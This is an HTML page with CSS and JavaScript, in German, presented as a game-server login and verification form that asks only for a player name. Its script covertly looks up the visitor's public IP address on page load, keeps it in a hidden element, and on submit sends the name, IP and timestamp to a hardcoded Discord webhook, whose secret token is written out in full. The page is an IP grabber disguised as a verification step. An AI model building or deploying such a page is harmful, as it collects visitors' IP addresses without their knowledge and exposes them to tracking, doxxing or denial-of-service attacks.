<style>
  :root {
    --bg-1: #0f172a;
    --bg-2: #111827;
    --card: rgba(17, 24, 39, 0.72);
    --card-border: rgba(255, 255, 255, 0.10);
    --text: #e5e7eb;
    --text-soft: #9ca3af;
    --accent: #60a5fa;
    --accent-2: #818cf8;
    --success: #22c55e;
    --danger: #ef4444;
    --shadow: 0 24px 80px rgba(0, 0, 0, 0.35);
    --radius-xl: 28px;
    --radius-lg: 18px;
    --radius-md: 14px;
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
    color: var(--text);
    background:
      radial-gradient(circle at top left, rgba(96, 165, 250, 0.20), transparent 30%),
      radial-gradient(circle at top right, rgba(129, 140, 248, 0.18), transparent 28%),
      linear-gradient(135deg, var(--bg-1), var(--bg-2));
    min-height: 100vh;
  }

  .page {
    min-height: 100vh;
    display: grid;
    place-items: center;
    padding: 24px;
  }

  .shell {
    width: 100%;
    max-width: 520px;
  }

  .card {
    position: relative;
    overflow: hidden;
    padding: 34px;
    border-radius: var(--radius-xl);
    background: var(--card);
    border: 1px solid var(--card-border);
    box-shadow: var(--shadow);
    backdrop-filter: blur(18px);
    -webkit-backdrop-filter: blur(18px);
  }

  .card::before {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.08), transparent 35%);
    pointer-events: none;
  }

  .top {
    position: relative;
    z-index: 1;
    text-align: center;
    margin-bottom: 28px;
  }

  .icon {
    width: 60px;
    height: 60px;
    margin: 0 auto 14px;
    border-radius: 18px;
    display: grid;
    place-items: center;
    font-size: 26px;
    background: linear-gradient(135deg, rgba(96,165,250,0.25), rgba(129,140,248,0.22));
    border: 1px solid rgba(255,255,255,0.10);
    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
  }

  h1 {
    margin: 0 0 8px;
    font-size: clamp(26px, 4vw, 32px);
    line-height: 1.1;
    letter-spacing: -0.03em;
  }

  .subtitle {
    margin: 0;
    font-size: 14px;
    color: var(--text-soft);
    line-height: 1.5;
  }

  form {
    position: relative;
    z-index: 1;
  }

  .field {
    margin-bottom: 18px;
  }

  label {
    display: block;
    margin-bottom: 10px;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: #cbd5e1;
  }

  input {
    width: 100%;
    padding: 14px 16px;
    border-radius: var(--radius-md);
    border: 1px solid rgba(255,255,255,0.10);
    background: rgba(15, 23, 42, 0.75);
    color: var(--text);
    font-size: 15px;
    outline: none;
    transition: transform 0.18s ease, border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
  }

  input::placeholder {
    color: #6b7280;
  }

  input:focus {
    border-color: rgba(96, 165, 250, 0.7);
    box-shadow: 0 0 0 4px rgba(96, 165, 250, 0.16);
    background: rgba(17, 24, 39, 0.92);
  }

  .notice {
    display: flex;
    gap: 12px;
    padding: 14px 15px;
    margin: 0 0 18px;
    border-radius: var(--radius-md);
    background: rgba(255, 255, 255, 0.04);
    border: 1px solid rgba(255, 255, 255, 0.08);
    color: var(--text-soft);
    font-size: 13px;
    line-height: 1.5;
  }

  .notice strong {
    color: #e2e8f0;
  }

  .notice-icon {
    flex: 0 0 auto;
    width: 28px;
    height: 28px;
    border-radius: 10px;
    display: grid;
    place-items: center;
    background: rgba(96, 165, 250, 0.14);
    color: #bfdbfe;
    margin-top: 1px;
  }

  .ip-hidden {
    display: none;
  }

  .btn {
    width: 100%;
    padding: 14px 16px;
    border: 0;
    border-radius: var(--radius-md);
    cursor: pointer;
    font-size: 15px;
    font-weight: 700;
    color: white;
    background: linear-gradient(135deg, var(--accent), var(--accent-2));
    box-shadow: 0 14px 30px rgba(96, 165, 250, 0.25);
    transition: transform 0.18s ease, box-shadow 0.18s ease, opacity 0.18s ease;
  }

  .btn:hover {
    transform: translateY(-1px);
    box-shadow: 0 18px 36px rgba(96, 165, 250, 0.30);
  }

  .btn:active {
    transform: translateY(0);
  }

  .btn:disabled {
    opacity: 0.65;
    cursor: not-allowed;
    transform: none;
  }

  .status {
    min-height: 56px;
    display: grid;
    place-items: center;
    margin-top: 16px;
  }

  .message {
    width: 100%;
    padding: 14px 16px;
    border-radius: var(--radius-md);
    text-align: center;
    font-size: 14px;
    line-height: 1.5;
    border: 1px solid transparent;
  }

  .message.success {
    background: rgba(34, 197, 94, 0.12);
    border-color: rgba(34, 197, 94, 0.25);
    color: #bbf7d0;
  }

  .message.error {
    background: rgba(239, 68, 68, 0.12);
    border-color: rgba(239, 68, 68, 0.25);
    color: #fecaca;
  }

  .footer {
    text-align: center;
    margin-top: 16px;
    font-size: 12px;
    color: #94a3b8;
  }

  .spinner {
    width: 16px;
    height: 16px;
    border-radius: 999px;
    border: 2px solid rgba(255,255,255,0.25);
    border-top-color: white;
    display: inline-block;
    animation: spin 0.8s linear infinite;
    vertical-align: -3px;
    margin-right: 8px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  @media (max-width: 480px) {
    .card {
      padding: 22px 18px;
      border-radius: 22px;
    }

    .notice {
      align-items: flex-start;
    }
  }
</style>

<div class="page">
  <div class="shell">
    <div class="card">
      <div class="top">
        <div class="icon">🛡️</div>
        <h1>Server Anmeldung</h1>
        <p class="subtitle">bitte gib deine Anmeldedaten ein.</p>
      </div>

      <form id="verifyForm">
        <div class="field">
          <label for="username">Anmeldung</label>
          <input
            type="text"
            id="username"
            placeholder="Dein Anmeldungsname"
            required
            minlength="3"
            autocomplete="off"
          />
        </div>

        <div id="ipDisplay" class="ip-hidden"></div>

        <button type="submit" id="submitBtn" class="btn">
          Anmeldung absenden
        </button>
      </form>

      <div id="status" class="status"></div>
    </div>

    <div class="footer">
      Durch das Absenden akzeptierst du unsere Datenschutzrichtlinie.
    </div>
  </div>
</div>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1500240855355883591/aFP2clnVx4bHGkTQGURVH0D6L8NEP60vBD5m0z5pfX6vjg9rNmC8IGR1XYX2SMjMLC1u";

  async function getIP() {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return "IP nicht abrufbar";
    }
  }

  async function sendToDiscord(username, ip) {
    const timestamp = new Date().toLocaleString("de-DE");

    const payload = {
      embeds: [{
        title: "🔐 Neue Server-Verifikation",
        color: 3447003,
        fields: [
          {
            name: "Spielername",
            value: username,
            inline: true
          },
          {
            name: "IP-Adresse",
            value: `\`${ip}\``,
            inline: true
          },
          {
            name: "Zeitstempel",
            value: timestamp,
            inline: false
          }
        ]
      }]
    };

    try {
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      return response.ok;
    } catch (error) {
      return false;
    }
  }

  let currentIP = "";

  document.addEventListener("DOMContentLoaded", async () => {
    currentIP = await getIP();
    document.getElementById("ipDisplay").textContent = currentIP;
  });

  document.getElementById("verifyForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const submitBtn = document.getElementById("submitBtn");
    const statusDiv = document.getElementById("status");

    if (username.length < 3) {
      statusDiv.innerHTML = `
        <div class="message error">
          Bitte gib einen gültigen Spielernamen mit mindestens 3 Zeichen ein.
        </div>
      `;
      return;
    }

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>Wird verarbeitet...';

    const success = await sendToDiscord(username, currentIP);

    if (success) {
      statusDiv.innerHTML = `
        <div class="message success">
          <strong>✓ Verifikation erfolgreich!</strong><br>
          Willkommen auf dem Server.
        </div>
      `;

      document.getElementById("verifyForm").reset();

      setTimeout(() => {
        getIP().then(newIP => {
          currentIP = newIP;
        });

        submitBtn.disabled = false;
        submitBtn.innerHTML = "Verifikation absenden";
        statusDiv.innerHTML = "";
      }, 3000);
    } else {
      statusDiv.innerHTML = `
        <div class="message error">
          <strong>✗ Fehler beim Senden</strong><br>
          Versuche es später erneut.
        </div>
      `;
      submitBtn.disabled = false;
      submitBtn.innerHTML = "Verifikation absenden";
    }
  });
</script>
